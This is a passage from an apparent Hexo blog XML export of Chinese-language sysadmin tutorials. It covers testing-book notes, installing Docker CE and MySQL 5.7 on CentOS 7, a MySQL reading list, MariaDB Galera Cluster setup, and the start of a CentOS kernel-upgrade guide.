<li><a class="link"   href="https://nmap.org/zenmap/" >zenmap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://nmap.org/man/zh/" >man-zh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://mp.weixin.qq.com/s?__biz=MjM5ODI5Njc2MA==&amp;mid=2655807136&amp;idx=1&amp;sn=15120a4bf9efb51d9ab2bceea1b1a645&amp;scene=2&amp;srcid=0420ZDZhVh8roJIjW6bFX8Vb#wechat_redirect" >扫描工具Nmap-开放端口扫描 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Testing</category>
      </categories>
      <tags>
        <tag>testing</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>《软件测试工程师成长之路》读书笔记</title>
    <url>/2018/testing/testing-engineer/</url>
    <content><![CDATA[<p>《软件测试工程师成长之路》读书笔记 – About Software Testing</p>
<h2 id="Theory">Theory</h2>
<ul>
<li>缺陷流程管理</li>
<li>功能测试</li>
<li>性能测试</li>
</ul>
<h2 id="Platform">Platform</h2>
<ul>
<li>web</li>
<li>client</li>
<li>app</li>
</ul>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/testing/testing-engineer/testingEngineer.png"
                      alt="testingEngineer.png" loading="lazy"
                ></p>
<h2 id="Strategy">Strategy</h2>
<p>测试阶段递进</p>
<p>需求测试 -&gt; 全回归测试 -&gt; 发布测试 -&gt; alpha测试 -&gt; beta测试</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/testing/testing-engineer/testing_guide.png"
                      alt="testing_guide.png" loading="lazy"
                ></p>
<h2 id="Tools">Tools</h2>
<h3 id="CodeCheck">CodeCheck</h3>
<p>代码检测</p>
<ul>
<li>CheckStyle</li>
<li>Findbugs</li>
<li><a class="link"   href="https://www.sonarqube.org/" >SonarQube <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="PerformanceTesting">PerformanceTesting</h3>
<p>性能测试</p>
<ul>
<li>Application
<ul>
<li>JMeter</li>
<li>LoadRunner</li>
</ul>
</li>
<li>Network
<ul>
<li>Nmap</li>
<li>Netperf</li>
</ul>
</li>
</ul>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="http://www.junit.org/" >JUnit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://testng.org/" >TestNG <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Testing</category>
      </categories>
      <tags>
        <tag>testing</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS 7环境下安装Docker CE</title>
    <url>/2018/docker/docker-install-on-centos/</url>
    <content><![CDATA[<p>Docker分为社区版和企业版两种版本，下面演示Docker社区稳定版本的安装过程。</p>
<h2 id="环境信息">环境信息</h2>
<blockquote>
<p>CentOS 7.4</p>
<p>Linux 3.10.0-693.17.1.el7.x86_64</p>
<p>Docker CE 17.12.0.ce-1.el7.centos</p>
</blockquote>
<h2 id="安装-Docker-CE">安装 Docker CE</h2>
<ul>
<li>check config</li>
</ul>
<p>安装前对系统资源进行检查</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/docker/docker/master/contrib/check-config.sh &gt; check-config.sh</span><br><span class="line">bash ./check-config.sh</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Step1. 安装依赖</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils \</span><br><span class="line">  device-mapper-persistent-data \</span><br><span class="line">  lvm2</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Step2. 添加仓库</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Step3. 安装Docker CE</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Step4. 启用、启动Docker</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> docker</span><br><span class="line">sudo systemctl start docker</span><br><span class="line">sudo systemctl status docker</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/docker/docker-install-on-centos/a5-img-01.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>Step5. 运行<code>hello-world</code>镜像</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/docker/docker-install-on-centos/a5-img-02.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://docs.docker.com/engine/installation/" >https://docs.docker.com/engine/installation/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.docker.com/install/linux/docker-ce/centos/" >https://docs.docker.com/install/linux/docker-ce/centos/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://download.docker.com/linux/centos/7/x86_64/stable/Packages/" >https://download.docker.com/linux/centos/7/x86_64/stable/Packages/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" >http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>docker</tag>
        <tag>install</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL书单推荐</title>
    <url>/2018/mysql/mysql-book-list/</url>
    <content><![CDATA[<blockquote>
<p>知行合一</p>
</blockquote>
<p>在 MySQL DBA 进阶的必经之路，下列书单都是值得一读的，推荐有缘人有精力认真读读看，会有收获颇多。</p>
<h3 id="Books">Books</h3>
<ul>
<li>[x] <a class="link"   href="https://item.jd.com/11381295.html" >深入浅出MySQL：数据库开发、优化与管理维护（第2版） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> base on MySQL 5.5 and MySQL 5.6</li>
<li>[x] <a class="link"   href="https://item.jd.com/11252326.html" >MySQL技术内幕：InnoDB存储引擎(第二版) / 姜承尧 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> base on MySQL 5.6</li>
<li>[x] <a class="link"   href="https://item.jd.com/11398721.html" >MySQL管理之道：性能调优、高可用与监控 / 贺春旸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> base on MySQL 5.5</li>
<li>[x] <a class="link"   href="https://item.jd.com/11973797.html" >MySQL管理之道：性能调优、高可用与监控（第2版） / 贺春旸 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> base on MySQL 5.7 and MariaDB 10</li>
<li>[x] <a class="link"   href="https://item.jd.com/12195430.html" >MySQL运维内参：MySQL、Galera、Inception核心原理与最佳实践 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[x] <a class="link"   href="https://item.jd.com/11720091.html" >MySQL技术内幕(第5版) / Paul DuBois <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[x] <a class="link"   href="https://item.jd.com/12010439.html" >分布式数据库架构及企业实践：基于Mycat中间件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="O’REILLY">O’REILLY</h3>
<ul>
<li>[x] <a class="link"   href="https://item.jd.com/11220393.html" >High Performance MySQL (高性能MySQL)(3rd v5.5) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[x] <a class="link"   href="https://item.jd.com/11741440.html" >MySQL Troubleshooting (MySQL排错指南) / Sveta Smirnova <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[ ] <a class="link"   href="https://item.jd.com/11687044.html" >MySQL High Availability <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="Oracle">Oracle</h3>
<ul>
<li>[x] <a class="link"   href="https://item.jd.com/11195926.html" >Oracle Database 11g &amp; MySQL 5.6 Handbook <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[ ] <a class="link"   href="http://effectivemysql.com/book/" >Effective MySQL: Optimizing SQL Statements / Ronald Bradford <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[x] <a class="link"   href="http://effectivemysql.com/book/" >Effective MySQL: Backup and Recovery / Ronald Bradford <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="MariaDB">MariaDB</h3>
<ul>
<li>[ ] <a class="link"   href="https://item.jd.com/11835700.html" >深入理解MariaDB与MySQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[ ] <a class="link"   href="https://item.jd.com/12055744.html" >Learning MySQL and MariaDB / Russell J. T. Dyer / April 2015. <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>[ ] <a class="link"   href="https://item.jd.com/11668495.html" >MariaDB原理与实现 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="Documention">Documention</h3>
<blockquote>
<p>无论如何都绕不开的第一手文档，便是官方文档。</p>
</blockquote>
<ul>
<li><a class="link"   href="https://dev.mysql.com/doc/" >MySQL Documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/" >MariaDB Knowledge Base <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.percona.com/software/documentation" >Percona Software Documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>book</tag>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>percona</tag>
        <tag>galera</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello MariaDB Galera Cluster</title>
    <url>/2018/mysql/say-hello-to-mariadb-galera-cluster/</url>
    <content><![CDATA[<p>基于MySQL实现的高可用方案有很多，如MySQL Group Cluster/MHA/MMM/MyCAT等等，下面来初步了解一下<code>MariaDB Galera Cluster</code>。</p>
<blockquote>
<p>MariaDB Galera Cluster, 是一个多主同步集群。仅在Linux上可用，只支持 InnoDB(XtraDB)存储引擎。最新稳定版本：MariaDB-10.2.12, Galera-25.3.22</p>
<p>Galera是意大利语，意思是Galley，桨帆船，一种巨大的人力划桨船，寓意着高度的一致性和协调性</p>
<p>Galera Cluster 公司前身是 Codership，Galera Cluster产品从2007年发布第一个版本至今已有十载</p>
<p><code>MariaDB Galera Cluster</code> 是MariaDB对Galera Cluster的封装。另一个对Galera Cluster的封装是 <code>Percona XtraDB Cluster</code>，简称PXC</p>
</blockquote>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/say-hello-to-mariadb-galera-cluster/galera_replication1.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="Feature">Feature</h2>
<ul>
<li>同步复制</li>
<li>多活主节点</li>
<li>任意节点可读写</li>
<li>成员自动控制，失败节点将被丢弃</li>
<li>节点自动加入</li>
<li>真正的行级并行复制</li>
<li>与单节点一样的使用体验</li>
<li>支持InnoDB存储引擎</li>
</ul>
<h2 id="Benefits">Benefits</h2>
<ul>
<li>没有slave延迟</li>
<li>没有事务丢失</li>
<li>读写可伸缩性</li>
<li>较小的客户端延迟</li>
<li>强数据一致性</li>
</ul>
<h2 id="Limitations">Limitations</h2>
<ul>
<li>仅支持InnoDB存储引擎，但是DDL(比如CREATE USER)语句是例外</li>
<li>不支持显示锁，包括LOCK TABLES, FLUSH TABLES {explicit table list} WITH READ LOCK, (GET_LOCK(), RELEASE_LOCK(),…).</li>
<li>所有的表必须有显示主键，支持联合主键</li>
<li>不支持分布式事务</li>
<li>事务大小限制。行数不超过128K，大小不超过1Gb</li>
<li>binary log 格式仅限于<code>binlog_format=ROW</code></li>
<li>不支持Windows</li>
</ul>
<h2 id="Start-MariaDB-Galera-Cluster">Start MariaDB Galera Cluster</h2>
<h3 id="Info">Info</h3>
<blockquote>
<p>CentOS 7.4</p>
<p>MariaDB 10.2.12</p>
<p>Galera 25.3.22</p>
</blockquote>
<p>下面实验的内容是<code>MariaDB Galera Cluster</code>的单节点安装配置：</p>
<h3 id="Step1-增加Yum源">Step1. 增加Yum源</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MariaDB 10.2 CentOS repository list</span></span><br><span class="line"><span class="comment"># http://downloads.mariadb.org/mariadb/repositories/</span></span><br><span class="line">[mariadb]</span><br><span class="line">name = MariaDB</span><br><span class="line">baseurl = http://yum.mariadb.org/10.2/centos7-amd64</span><br><span class="line">gpgkey=https://yum.mariadb.org/RPM-GPG-KEY-MariaDB</span><br><span class="line">gpgcheck=1</span><br></pre></td></tr></table></figure></div>
<h3 id="Step2-安装MariaDB">Step2. 安装MariaDB</h3>
<p>通过yum方式进行安装</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># list available package</span></span><br><span class="line">yum --disablerepo=\* --enablerepo=mariadb list available</span><br><span class="line"><span class="comment"># install</span></span><br><span class="line">sudo yum install MariaDB-server MariaDB-client</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/say-hello-to-mariadb-galera-cluster/a3-img-01.png"
                      alt="" loading="lazy"
                ><br>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/say-hello-to-mariadb-galera-cluster/a3-img-02.png"
                      alt="" loading="lazy"
                ></p>
<h3 id="Step3-配置Galera">Step3. 配置Galera</h3>
<p>需要配置下列必填参数</p>
<ul>
<li><code>wsrep_provider</code> — Path to the Galera library</li>
<li><code>wsrep_cluster_address</code> — see cluster connection URL</li>
<li><code>binlog_format=ROW</code> — see Binary Log Formats</li>
<li><code>default_storage_engine=InnoDB</code></li>
<li><code>innodb_autoinc_lock_mode=2</code></li>
<li><code>innodb_doublewrite=1</code> (the default) when using Galera provider of version &gt;= 2.0.</li>
<li><code>query_cache_size=0</code> (only for versions prior to 5.5.40-galera, 10.0.14-galera and 10.1.2)</li>
<li><code>wsrep_on=ON</code> — Enable wsrep replication (starting 10.1.1)</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># galera</span><br><span class="line">[galera]</span><br><span class="line">wsrep_provider=/usr/lib64/galera/libgalera_smm.so</span><br><span class="line">wsrep_cluster_address=&quot;gcomm://&quot;</span><br><span class="line">binlog_format=ROW</span><br><span class="line">default_storage_engine=InnoDB</span><br><span class="line">innodb_autoinc_lock_mode=2</span><br><span class="line">innodb_doublewrite=1</span><br><span class="line">query_cache_size=0</span><br><span class="line">wsrep_on=ON</span><br></pre></td></tr></table></figure></div>
<h3 id="Step3-启动MariaDB">Step3. 启动MariaDB</h3>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start mariadb</span><br><span class="line">sudo systemctl status mariadb</span><br></pre></td></tr></table></figure></div>
<h3 id="Step4-查看Galera状态">Step4. 查看Galera状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW STATUS LIKE &#x27;wsrep_%&#x27;;</span><br></pre></td></tr></table></figure></div>
<p>monitor status and health of a Galera cluster</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">galera-status</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/say-hello-to-mariadb-galera-cluster/a3-img-03.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="Summary">Summary</h2>
<p>以上内容仅仅是初步窥探<code>MariaDB Galera Cluster</code>，如果需要深入了解，或是想搭建能够投产的集群，则还有一个很长的Todo List。</p>
<h2 id="SST-IST">SST/IST</h2>
<p>State Snapshot Transfer (SST)</p>
<ul>
<li>Percona XtraBackup (Recommended)</li>
<li>rsync</li>
<li>mysqldump</li>
</ul>
<p>Incremental State Transfer (IST) using GCache</p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://mariadb.com/kb/en/library/galera-cluster/" >https://mariadb.com/kb/en/library/galera-cluster/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://galeracluster.com/products/" >http://galeracluster.com/products/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/library/mariadb-galera-cluster-known-limitations/" >https://mariadb.com/kb/en/library/mariadb-galera-cluster-known-limitations/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://downloads.mariadb.org/mariadb/repositories/" >https://downloads.mariadb.org/mariadb/repositories/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/fridim/galera-status" >https://github.com/fridim/galera-status <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MariaDB</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>galera</tag>
        <tag>replication</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS 7 下安装 MySQL 5.7 的三种方案</title>
    <url>/2018/mysql/how-to-install-mysql-on-centos/</url>
    <content><![CDATA[<p>MySQL是时下最流行的开源关系型数据库之一，下面来简要介绍三种安装MySQL Database的方案。</p>
<ul>
<li>方案一：连接Yum仓库安装MySQL</li>
<li>方案二：安装MySQL的Linux二进制包</li>
<li>方案三：编译MySQL源码进行安装</li>
</ul>
<h2 id="实验环境">实验环境</h2>
<blockquote>
<p>CentOS 7.4</p>
<p>Linux 3.10.0-693.17.1.el7.x86_64</p>
<p>MySQL Community Server 5.7.21</p>
</blockquote>
<h2 id="方案一：连接Yum仓库安装MySQL">方案一：连接Yum仓库安装MySQL</h2>
<p>此方案适用于有公网环境的服务器或者实验环境。<br>
当然，此方案还可变换为连接内网的yum仓库进行安装，或者下载RPM包，再上传至服务器进行安装。<br>
下面演示连接MySQL官方的Yum仓库进行安装。</p>
<ul>
<li>Step1. 检查既存的安装包</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum list installed mariadb*</span><br><span class="line">sudo yum list installed mysql*</span><br><span class="line">sudo yum list installed percona*</span><br></pre></td></tr></table></figure></div>
<p>由于CentOS推荐使用MariaDB，所以系统预装了<code>mariadb-libs.x86_64</code>，我们将之卸载并安装<code>mysql-community-libs</code>。</p>
<ul>
<li>Step2. 下载并安装Yum源</li>
</ul>
<p>下载地址: <code>https://dev.mysql.com/downloads/repo/yum/</code></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Install yum repository</span></span><br><span class="line">sudo yum install -y mysql57-community-release-el7-9.noarch.rpm</span><br><span class="line"><span class="comment"># Enable yum mysql57-community</span></span><br><span class="line">sudo yum-config-manager --<span class="built_in">enable</span> mysql57-community</span><br><span class="line"><span class="comment"># List available package</span></span><br><span class="line">sudo yum --disablerepo=\* --enablerepo=mysql57-community list available</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/how-to-install-mysql-on-centos/a2-img-01.png"
                      alt="" loading="lazy"
                ><br>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/how-to-install-mysql-on-centos/a2-img-02.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>Step3. 安装mysql-community-server</li>
</ul>
<p>在安装MySQL Server的同时，需要安装<code>mysql-community-libs/mysql-community-common/mysql-community-client</code>。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Install MySQL Server</span></span><br><span class="line">sudo yum install -y mysql-community-server.x86_64 mysql-community-libs.x86_64 mysql-community-common.x86_64 mysql-community-client.x86_64</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/how-to-install-mysql-on-centos/a2-img-03.png"
                      alt="" loading="lazy"
                ></p>
<p>此时，MySQL Server已安装完成，且使用systemd进行管理。</p>
<ul>
<li>Step4. 启动MySQL</li>
</ul>
<p>查看状态，并启动MySQL服务。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># check status</span></span><br><span class="line">sudo systemctl status mysqld</span><br><span class="line"><span class="comment"># start mysqld</span></span><br><span class="line">sudo systemctl start mysqld</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/how-to-install-mysql-on-centos/a2-img-04.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>Step5. 登录数据库</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/mysql/how-to-install-mysql-on-centos/a2-img-05.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="方案二：安装MySQL的Linux二进制包">方案二：安装MySQL的Linux二进制包</h2>
<p>本方案满足大部分Linux发行版，并不局限于某个发行版的某个版本，只要依赖包满足要求即可。</p>
<p>实验步骤如下。</p>
<ul>
<li>Step1. 安装依赖</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Remove mariadb-libs.x86_64</span></span><br><span class="line">rpm -qa | grep mariadb | xargs rpm -e --nodeps</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install mysql dependence</span></span><br><span class="line">sudo yum install -y gcc.x86_64 gcc-c++.x86_64 cmake ncurses-devel perl perl-Data-Dumper glibc.x86_64 libaio</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Step2. 安装二进制包</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">groupadd mysql</span><br><span class="line"><span class="comment"># useradd -r -g mysql -s /bin/false mysql</span></span><br><span class="line">useradd -r -g mysql mysql</span><br><span class="line"><span class="built_in">cd</span> /usr/local</span><br><span class="line">tar zxvf /path/to/mysql-VERSION-OS.tar.gz</span><br><span class="line"><span class="built_in">ln</span> -s full-path-to-mysql-VERSION-OS mysql</span><br><span class="line"><span class="built_in">cd</span> mysql</span><br><span class="line"><span class="built_in">chown</span> -R mysql .</span><br><span class="line"><span class="built_in">chgrp</span> -R mysql .</span><br><span class="line">scripts/mysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data</span><br><span class="line"><span class="built_in">chown</span> -R root .</span><br><span class="line"><span class="built_in">chown</span> -R mysql data</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> support-files/my-small.cnf /etc/my.cnf</span><br><span class="line">bin/mysqld_safe --user=mysql &amp;</span><br></pre></td></tr></table></figure></div>
<h2 id="方案三：编译MySQL源码进行安装">方案三：编译MySQL源码进行安装</h2>
<p>此种方案较为复杂，且非常耗时，但却较为灵活、可配置多项调试、定制参数。</p>
<p>实验步骤如下。</p>
<ul>
<li>Step1. 安装依赖</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># same as plan two</span></span><br><span class="line">sudo yum install -y gcc.x86_64 gcc-c++.x86_64 cmake ncurses-devel perl perl-Data-Dumper glibc.x86_64 libaio</span><br><span class="line"><span class="comment"># add dependency</span></span><br><span class="line">sudo yum install -y perl time libaio-devel numactl-devel openssl-devel zlib-devel cyrus-sasl-devel perl-Env rpm-build</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Step2. 编译源码</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">rpmbuild --rebuild --clean mysql-community-5.7.21-1.el7.src.rpm</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Step3. 安装编译好的RPM包</li>
</ul>
<p>之后实验步骤参考方案一(Step3)。</p>
<h2 id="Summary">Summary</h2>
<p>以上三种方案中，通过RPM包的形式安装最为简单、实用、普遍，此方案对于日后的升级维护也很有助力。如果对数据库的安装要求较高，或是需要进行调试，则方案三是首选。</p>
<p>除此之外，还有其他的安装方案可以选择，比如docker。</p>
<p>再补充一点，MySQL的重要分支MariaDB和Percona Server同样可以按照类似的方式进行安装。</p>
<h2 id="Reference">Reference</h2>
<p>About download and install.</p>
<ul>
<li><a class="link"   href="https://dev.mysql.com/downloads/mysql/" >download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/installing.html" >refman-install <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/binary-installation.html" >refman-install-binary <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/installing-source-distribution.html" >refman-install-source <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/windows-installation.html" >refman-install-windowns <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html" >source-configuration-options <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 5.7</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>install</tag>
        <tag>mysql</tag>
        <tag>mysql 5.7</tag>
      </tags>
  </entry>
  <entry>
    <title>升级 CentOS 7.4 内核版本的三种方案</title>
    <url>/2018/centos/centos-7-kernel-upgrade/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/img/centos/centos-logo.png"
                      alt="" loading="lazy"
                ></p>
<p>在实验环境下，已安装了最新的CentOS 7.4操作系统，现在需要升级内核版本。下面提供三种常用方案，以供参考。</p>
<ul>
<li>方案一：小版本升级</li>
<li>方案二：大版本升级</li>
<li>方案三：自编译升级</li>
</ul>
<h2 id="实验环境信息">实验环境信息</h2>
<blockquote>
<p>CentOS-7-x86_64-Minimal-1708.iso</p>
<p>CentOS Linux release 7.4.1708 (Core)</p>
<p>Kernel 3.10.0-693.el7.x86_64</p>
</blockquote>
<h2 id="方案一：小版本升级">方案一：小版本升级</h2>
<p>小版本升级，指的是在当前内核大版本不变的基础之上，做小版本更新。此方法适用于更新内核补丁。<br>
确认连接并同步CentOS自带yum源，更新内核版本。</p>
<p>实验步骤：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum list kernel</span><br><span class="line">sudo yum list kernel --showduplicates</span><br><span class="line">sudo yum update -y kernel</span><br><span class="line"><span class="comment"># yum update kernel-3.10.0-693.21.1.el7</span></span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-01.png"
                      alt="" loading="lazy"
                ><br>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-02.png"
                      alt="" loading="lazy"
                ><br>
<img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-03.png"
                      alt="" loading="lazy"
                ></p>
<p>此时，已安装成功，但若想将系统运行在新版本的kernel上，则需要重新启动操作系统。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-04.png"
                      alt="" loading="lazy"
                ></p>
<p>重启完成，至此，Kernel版本已升级至<code>3.10.0-693.17.1.el7.x86_64</code></p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/centos/centos-7-kernel-upgrade/img-05.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="方案二：大版本升级">方案二：大版本升级</h2>
<p>大版本升级，是指将升级内核最新的主线版本或者长期支持版本。</p>
<p>实验步骤：</p>
<p>载入elrepo源，搜索内核更新资源，并进行更新操作。</p>
